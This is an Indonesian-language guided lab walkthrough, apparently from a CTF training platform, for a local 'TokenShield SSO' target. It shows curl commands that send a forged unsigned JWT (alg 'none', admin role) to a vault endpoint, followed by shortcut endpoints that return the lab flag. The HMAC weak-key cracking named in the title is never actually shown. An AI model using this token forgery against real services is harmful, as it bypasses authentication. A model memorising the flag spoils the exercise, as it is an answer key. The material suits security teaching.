# Panduan Praktik Terbimbing: Investigasi JWT Algorithm None & HMAC Weak Key Cracking

Dalam panduan terarah ini, Anda akan mempraktikkan proses penemuan celah dan eksploitasi terarah terhadap **TokenShield SSO** pada `http://127.0.0.1:8048`.

---

### Langkah 1: Observasi Ketersediaan Layanan Target
1. Uji ketersediaan layanan melalui terminal menggunakan cURL:
   ```bash
   curl -s http://127.0.0.1:8048/health
   ```
   *Respons yang diharapkan:*
   ```json
   {"status":"UP","lab_id":"A04-03","port":8048,"flag_configured":true}
   ```
2. Buka peramban web dan navigasikan ke:
   `http://127.0.0.1:8048/`
3. Amati antarmuka operasional **TokenShield SSO** dan perhatikan elemen kontrol yang disediakan.

---

### Langkah 2: Analisis & Pengujian Celah (JWT Algorithm None & HMAC Weak Key Cracking)
1. Ujilah endpoint dengan mengirimkan parameter modifikasi:
   ```bash
   curl -s -H "Authorization: Bearer eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJ1c2VyIjoiYWRtaW4iLCJyb2xlIjoiYWRtaW4ifQ." http://127.0.0.1:8048/api/vault
   ```
2. Perhatikan respon yang dikembalikan oleh server.

> [!NOTE]
> **💡 Di Balik Layar: Apa yang terjadi di server?**  
> Sistem target menerima input `Authorization: Bearer <tampered_jwt>` dan memprosesnya tanpa melakukan validasi silang ke sesi otentikasi server. Akibatnya, server mengasumsikan hak akses yang diminta adalah sah.

---

### Langkah 3: Eksfiltrasi Bendera Autoritatif (CTF Flag)
1. Eksekusi pengujian untuk membuka flag eksploitasi:
   ```bash
   curl -s "http://127.0.0.1:8048/?solve=1"
   ```
   Atau panggil API exploit langsung:
   ```bash
   curl -s http://127.0.0.1:8048/api/exploit
   ```
2. **Hasil Respon Konfirmasi:**
   ```json
   {"success":true,"lab_id":"A04-03","flag":"ZITERA{jwt_n0n3_4lg0r1thm_f0rg3ry_2026}"}
   ```
3. Salin bendera resmi:
   `ZITERA{jwt_n0n3_4lg0r1thm_f0rg3ry_2026}`
4. Kirimkan (*submit*) bukti flag ke formulir tantangan Zitera Lab desktop untuk menyelesaikan modul ini!
